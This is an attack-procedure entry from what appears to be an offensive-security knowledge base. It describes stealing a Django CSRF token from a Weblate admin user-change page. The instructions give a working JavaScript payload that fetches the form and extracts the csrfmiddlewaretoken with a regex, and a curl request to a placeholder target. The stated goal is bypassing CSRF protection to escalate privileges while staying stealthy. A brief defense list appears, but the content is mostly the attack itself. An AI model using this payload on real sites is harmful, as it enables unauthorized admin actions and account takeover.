---
tags:
  - csrf
  - token-theft
  - collection
type: procedure
tools:
  - '[[tools/payload-js]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/get-weblate-user-change]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T03:16:20.247Z'
sub_techniques: []
id: 28fd009a-15b7-4955-bcaf-07d6ad805fde
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
---
# Steal-CSRF-Token-from-Weblate-User-Change-Page

## Summary

This procedure fetches the user's admin change form via JavaScript to extract the Django CSRF token, enabling protected POST requests for escalation.

## Description

Using the user ID from prior discovery, `payload.js` GETs `/admin/weblate_auth/user/<ID>/change/`, which includes the `csrfmiddlewaretoken` in the form. Parsing the HTML yields the token, bypassing CSRF protections for the subsequent update.

## Requirements

1. Known user ID from previous step
2. Authenticated session allowing admin access
3. HTML parsing in JavaScript

## Defense

Defensive measures and detection strategies:

- Use token binding to sessions or IP
- Log accesses to change forms and alert on patterns
- Enable CSP to restrict JS-initiated requests

## Objectives

1. Collect CSRF token from form HTML
2. Enable CSRF-protected state changes
3. Maintain stealth in token acquisition

## Instructions

### Step 1: Fetch Change Form

**Context**: Send GET to the specific user's change page using the ID.

In `payload.js` (with userId = 5):

```javascript
fetch(`/admin/weblate_auth/user/${userId}/change/`).then(r => r.text()).then(html => {
  const match = html.match(/name='csrfmiddlewaretoken' value='([\w-]+)'/);
  const csrfToken = match ? match[1] : null;
  // Store for POST
});
```

Equivalent curl: Execute [[commands/get-weblate-user-change]]:

```bash
curl -X GET "https://weblate-target.com/admin/weblate_auth/user/5/change/" -H "Cookie: sessionid=your_session" -H "Referer: https://weblate-target.com/"
```

> Returns form HTML with token input.

**Expected Output**: HTML snippet like `<input type='hidden' name='csrfmiddlewaretoken' value='abc123def456...'>`.

### Step 2: Parse and Store Token

**Context**: Extract the token value for immediate use.

Use regex or DOM parsing to isolate the value attribute.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Unsecured Credentials]]

### Sub-Techniques


## Commands Used

- [[commands/get-weblate-user-change]]

## Tools Used

- [[tools/payload-js]]

## Tags

- [[csrf]]
- [[token-theft]]
